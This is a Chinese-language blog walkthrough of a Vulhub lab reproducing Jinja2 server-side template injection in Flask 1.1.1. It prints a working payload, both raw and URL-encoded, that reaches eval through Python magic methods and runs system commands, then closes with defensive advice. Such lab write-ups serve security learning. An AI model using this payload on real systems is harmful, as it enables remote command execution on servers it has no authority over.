---
title: Flask
published: 2026-11-14T11:00:00+08:00
description: 全面解析 Flask 框架下 Jinja2 模板引擎引发的服务端模板注入（SSTI）漏洞。涵盖漏洞成因、Python 魔法方法利用链（寻找 eval 函数）的深度分析，以及结合 Vulhub 靶场的实战复现步骤与防御方案。
image: images/Pasted image 20261114142331.png
tags:
  - Vulhub
  - CVE
category: Vulhub靶场
draft: false
pinned: false
lang: zh-CN
author: Ynm
comment: true
---

| 项目          | 详情                                                          |
| ----------- | ----------------------------------------------------------- |
| **攻击机**     | Kali Linux（IP：192.168.197.128）                              |
| **靶机**      | Ubuntu Server 24.04（IP：192.168.197.88）                      |
| **CVSS 评分** | 9.8（严重）                                                     |
| **漏洞类型**    | 服务端模板注入（SSTI） → 远程代码执行（RCE）                                 |
| **影响组件**    | Flask 1.1.1（及其使用的 Jinja2 模板引擎）                              |
| **利用条件**    | 用户输入未经严格过滤直接被渲染到模板中                                         |
| **核心原理**    | 后端将用户输入作为模板代码执行，导致攻击者可以利用 Python 的魔法方法（Magic Methods）执行任意代码 |


## 一、漏洞原理

**服务端模板注入（Server-Side Template Injection, SSTI）** 是一种由于开发者将用户输入直接拼接进模板并在服务端渲染，从而导致代码执行的漏洞。

**它与 SSRF（服务端请求伪造）的本质区别在于：SSTI 的核心是“代码执行”**，攻击者试图利用模板引擎的解析机制（如 `{{...}}`）让服务器运行恶意代码，目标是获取服务器权限；而 **SSRF 的核心是“网络请求伪造”**，攻击者试图让服务器作为跳板，向内网或外部系统发起 HTTP 等网络请求，目标是探测内网或攻击内网脆弱服务。两者的触发机制和最终危害方向截然不同。

Flask 是 Python 中非常流行的轻量级 Web 框架，它默认使用 **Jinja2** 作为模板引擎。在 Jinja2 中，`{{ ... }}` 包裹的内容会被当作 Python 表达式执行。当应用代码写成类似 `render_template_string('Hello ' + name)` 时，如果用户输入了 `{{ 7*7 }}`，Jinja2 引擎会将其计算为 `49` 并返回，这就是最基本的 SSTI 验证。

如果仅能进行数学计算，危害有限。但由于 Python 是一门极其灵活的语言，利用其**魔法方法（Magic Methods）** 的继承关系，我们可以从最基础的字符串或列表对象，一步步向上寻找到包含 `eval`、`system` 或 `popen` 的全局函数，最终实现远程代码执行（RCE）。

**常见的 Python 利用链如下**：
1. `[]` 或 `""`：获取一个基础的列表或字符串对象。
2. `.__class__`：获取该对象的类（如 `list`）。
3. `.__base__`：获取该类的父类（通常是 `object` 根类）。
4. `.__subclasses__()`：获取所有继承自 `object` 的子类列表（这是一个巨大的宝藏）。
5. 从中寻找带有全局命名空间或执行能力的类（如 `catch_warnings`）。
6. 通过 `.__init__.__globals__` 获取该类的全局变量字典，从中找到 `eval`、`__builtins__` 等执行函数。

## 二、漏洞复现

环境启动后，访问 `http://192.168.197.88:8000/` 即可看到默认页面。

### 1. 验证漏洞是否存在
构造简单的数学运算，检查后端是否执行了表达式：
```text wrap
http://192.168.197.88:8000/?name={{233*233}}
```
页面回显 `54289`，证明存在 SSTI 漏洞。
![](images/Pasted%20image%2020261114143042.png)
### 2. 获取 eval 函数执行系统命令
根据官方提供的 POC，可以利用 `catch_warnings` 类的全局命名空间，提取出 `eval` 函数并执行任意 Python 代码。Payload 如下（为了方便阅读，未进行 URL 编码）：

```jinja2 wrap
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("id").read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}
```

**利用原理**：
1. `[].__class__.__base__.__subclasses__()` 获取了当前 Python 环境加载的所有模块类。
2. 遍历寻找名为 `catch_warnings` 的类（这是 Python 内置模块中的一个类）。
3. `c.__init__.__globals__.values()` 获取该类的全局变量，这里面包含了当前加载模块的很多内置函数。
4. 检查这些全局变量中是否存在 `eval` 键名。
5. 调用 `eval('__import__("os").popen("id").read()')` 执行系统命令并读取回显。

### 3. 发送 URL 编码后的 Payload
将上述 Payload 进行 URL 编码后，直接访问以下链接（已编码）：

```text wrap
http://192.168.197.88:8000/?name=%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()%20%25%7D%0A%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(%22os%22).popen(%22id%22).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D
```

访问后，页面将回显 `uid=0(root) gid=0(root) groups=0(root)`，证明已成功执行系统命令。
![](images/Pasted%20image%2020261114143732.png)
后续将`id`换成其他的命令，即可执行任意命令。
## 三、防御建议

1. **严格过滤用户输入**：永远不要信任用户的输入，在将输入渲染到模板前，必须使用正则或白名单进行严格过滤，拦截包含 `{{`、`}}`、`__class__` 等危险字符的请求。
2. **使用安全渲染函数**：尽量使用 `render_template()` 渲染静态 HTML 文件，并将用户输入作为**变量传递**，而不是直接拼接进模板字符串（避免使用 `render_template_string()`）。
3. **使用 Jinja2 沙箱环境**：如果业务必须动态渲染模板，可以使用 Jinja2 提供的 `SandboxedEnvironment`，它会限制许多危险的类和方法调用，降低 SSTI 被利用的风险。
4. **部署 WAF**：在网关层拦截包含常见 SSTI 探测特征（如 `{{7*7}}`、`__subclasses__`）的 HTTP 请求。